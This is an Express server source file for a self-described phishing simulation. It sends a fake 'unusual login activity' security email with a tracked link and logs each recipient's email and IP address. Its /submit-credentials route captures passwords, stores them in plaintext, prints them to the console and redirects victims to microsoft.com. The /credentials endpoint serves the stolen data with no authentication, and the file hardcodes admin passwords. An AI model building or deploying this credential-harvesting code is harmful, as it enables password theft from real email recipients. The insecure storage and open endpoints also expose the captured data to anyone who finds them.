const mongoose = require("mongoose");
const PhishingClick = require("./models/PhishingClick");
const CapturedCredential = require("./models/CapturedCredential");
const emailTemplateRoutes = require("./routes/emailTemplates");

require("dotenv").config();
const express = require("express");
const cors = require("cors");
const session = require("express-session");
const nodemailer = require("nodemailer");
const axios = require("axios");
const cheerio = require("cheerio");
const path = require("path"); // ✅ Needed to serve React build

const app = express();
app.use(express.static("public"));
app.use(
  cors({
    origin: "http://localhost:3000",
    credentials: true,
  }),
);
app.use(express.json());

// Session configuration
app.use(
  session({
    secret: process.env.SESSION_SECRET || "phishing-sim-secret-key",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false, // Set to true in production with HTTPS
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
    },
  }),
);

// Email template routes
app.use("/api/email-templates", emailTemplateRoutes);

// Authentication middleware
const requireAuth = (req, res, next) => {
  if (req.session && req.session.user) {
    next();
  } else {
    res.status(401).json({ error: "Authentication required" });
  }
};

// Users database (in production, use proper database)
const users = {
  admin: { username: "admin", password: "admin", role: "admin" },
  user: { username: "user", password: "Hizan@007", role: "user" },
};

// Login endpoint
app.post("/api/auth/login", (req, res) => {
  const { username, password } = req.body;

  if (users[username] && users[username].password === password) {
    req.session.user = {
      username: users[username].username,
      role: users[username].role,
    };
    res.json({
      success: true,
      user: req.session.user,
      message: "Login successful",
    });
  } else {
    res.status(401).json({ error: "Invalid username or password" });
  }
});

// Logout endpoint
app.post("/api/auth/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      res.status(500).json({ error: "Could not log out" });
    } else {
      res.json({ success: true, message: "Logout successful" });
    }
  });
});

// Get current user endpoint
app.get("/api/auth/user", (req, res) => {
  if (req.session && req.session.user) {
    res.json({ user: req.session.user });
  } else {
    res.status(401).json({ error: "Not authenticated" });
  }
});

// Connect to MongoDB
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));

const PORT = process.env.PORT || 5000;

// Configure Email Transporter
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || "smtp.gmail.com",
  port: process.env.SMTP_PORT || 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// API Endpoint to Send Phishing Email
app.post("/send-phishing-email", async (req, res) => {
  const { recipientEmail } = req.body;

  if (!recipientEmail) {
    return res.status(400).json({ error: "Recipient email is required" });
  }

  try {
    // Static HTML email content (you can customize this)
    const emailContent = `
      <p>Hello,</p>
      <p>We detected unusual login activity in your account. Please <a href="https://phishing-sim-7mca.onrender.com/track-click?email=${recipientEmail}">click here to verify</a>.</p>
      <p>Thank you,<br/>Security Team</p>
    `;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipientEmail,
      subject: "Important Security Alert",
      html: emailContent,
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: "Phishing email sent successfully!" });
  } catch (error) {
    console.error("Error sending phishing email:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
});

// API Endpoint to Track Clicks on Phishing Links
app.get("/track-click", async (req, res) => {
  const { email } = req.query;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  try {
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // ✅ Only create a record if it doesn't exist already for this email
    const alreadyClicked = await PhishingClick.findOne({ email });

    if (!alreadyClicked) {
      await PhishingClick.create({ email, ipAddress: ip });
    }

    res.redirect("/login.html");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error tracking click");
  }
});

// Get all phishing click data
app.get("/clicks", async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 });
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching clicks:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// Get all captured credentials
app.get("/credentials", async (req, res) => {
  try {
    const credentials = await CapturedCredential.find().sort({ timestamp: -1 });
    res.json(credentials);
  } catch (error) {
    console.error("Error fetching credentials:", error);
    res.status(500).json({ error: "Failed to fetch credentials" });
  }
});

// API Endpoint to Save Submitted Credentials
app.post("/submit-credentials", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  try {
    await CapturedCredential.findOneAndUpdate(
      { email }, // Match by email
      {
        $set: { password, timestamp: new Date() }, // Update password and timestamp
      },
      { upsert: true, new: true }, // Insert if not found
    );

    console.log("Captured credentials saved/updated:", { email, password });
    res.redirect("https://www.microsoft.com");
  } catch (err) {
    console.error("Error saving credentials:", err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/phishing-clicks", async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 }); // latest first
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching click data:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// ✅ Serve React frontend build files (only for production)
// In development, React runs on port 3000, so we don't need this
if (process.env.NODE_ENV === "production") {
  app.use(express.static(path.join(__dirname, "phishing-sim-ui", "build")));

  app.get("*", (req, res) => {
    res.sendFile(
      path.join(__dirname, "phishing-sim-ui", "build", "index.html"),
    );
  });
}

// Start Server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
